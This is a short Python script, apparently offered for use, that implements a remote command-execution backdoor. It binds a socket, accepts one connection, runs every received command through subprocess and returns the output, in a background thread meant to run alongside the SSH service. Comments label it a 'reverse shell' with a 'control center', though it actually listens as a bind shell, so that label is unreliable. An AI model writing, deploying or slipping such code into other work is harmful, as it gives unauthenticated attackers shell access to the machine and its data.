import socket
import subprocess

# Create a listening socket for the reverse shell
reverse_shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
HOST_REVERSE_SHELL  = '192.168.15.170' # This would be your control center
PORT_REVERSE_SHELL = 2221  # Pick an unused port number
reverse_shell_socket.bind((HOST_REVERSE_SHELL, PORT_REVERSE_SHELL))
reverse_shell_socket.listen(1)

# Create the helper function that handles incoming connections & executes commands
def handle_connection():
    conn, addr = reverse_shell_socket.accept()
    while True:
        cmd = conn.recv(1024).decode()  # Receive command from client
        if not cmd: break
        output = subprocess.getoutput(cmd) # Execute command
        conn.send(output.encode())  # Send the output back

# Start a separate thread to run the helper function independently of the SSH service
import threading
threading.Thread(target=handle_connection).start()